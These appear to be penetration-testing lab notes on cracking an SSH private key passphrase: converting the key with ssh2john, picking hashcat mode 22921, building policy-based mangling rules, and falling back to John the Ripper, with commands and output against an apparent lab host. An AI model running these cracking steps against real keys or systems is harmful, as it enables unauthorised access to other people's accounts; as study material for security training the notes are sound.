SSH_Passphrase Cracking

- [ ] \## locate private key to use

Attempting to connect with a private key...

```
kali@kali:~/passwordattacks$ chmod 600 id_rsa

kali@kali:~/passwordattacks$ ssh -i id_rsa -p 2222 dave@192.168.50.201
The authenticity of host '[192.168.50.201]:2222 ([192.168.50.201]:2222)' can't be established.
ED25519 key fingerprint is SHA256:ab7+Mzb+0/fX5yv1tIDQsW/55n333/oGARIluRonao4.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.201]:2222' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa':
Enter passphrase for key 'id_rsa':
Enter passphrase for key 'id_rsa':
dave@192.168.50.201's password: 

kali@kali:~/passwordattacks$ ssh -i id_rsa -p 2222 dave@192.168.50.201
Enter passphrase for key 'id_rsa':
Enter passphrase for key 'id_rsa':
Enter passphrase for key 'id_rsa':
```

- [ ] \## Convert private key to johnhash

```sh
kali@kali:~/passwordattacks$ ssh2john id_rsa > ssh.hash

kali@kali:~/passwordattacks$ cat ssh.hash
id_rsa:$sshng$6$7059e78a8d3764ea1e883fcdf592feb7$1894$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000107059e78a8d3764ea1e883fcdf592feb7000000100000000100000197000000077373682...
```

- [ ] \## ID the Hash

```sh
ali@kali:~/passwordattacks$ hashcat -h | grep -i "ssh" 
...
sshng$6$
  10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1                 | Enterprise Application Software (EAS)
  22911 | RSA/DSA/EC/OpenSSH Private Keys ($0$)               | Private Key
  22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)<---Correct    | Private Key
  22931 | RSA/DSA/EC/OpenSSH Private Keys ($1, $3$)           | Private Key
  22941 | RSA/DSA/EC/OpenSSH Private Keys ($4$)               | Private Key
  22951 | RSA/DSA/EC/OpenSSH Private Keys ($5$)               | Private Key
```

- [ ] \## Select Wordlist and create rule if needed
    
    For example:
    

```txt
New password policy starting in January 2022. 
Passwords need 3 numbers, a capital letter and a special character
```

Use c for the capitalization of the first letter and $1 $3 $7 for the numerical values.
To address the special characters create rules to append the different special characters $!, $@, and $#.

```sh
kali@kali:~/passwordattacks$ cat ssh.rule
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
```

- [ ] \## Use Hashcat
    
    w/ wordlist and correct -m switch from two steps ago, (22921 in this instance).
    `hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force`
    
- [ ] \### If there is an issue, (such as aes-256-ctr), try using John
    

```sh
sudo cp /etc/john/john.conf /etc/john/john.conf.bak
sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'

sudo john --wordlist=ssh.passwords --rules=sshRules ssh.hash
# Replace original .conf if needed

# Also, be cognizant of copying keys from terminal.
# May need to remove any whitespace added (cyberchef can help)
```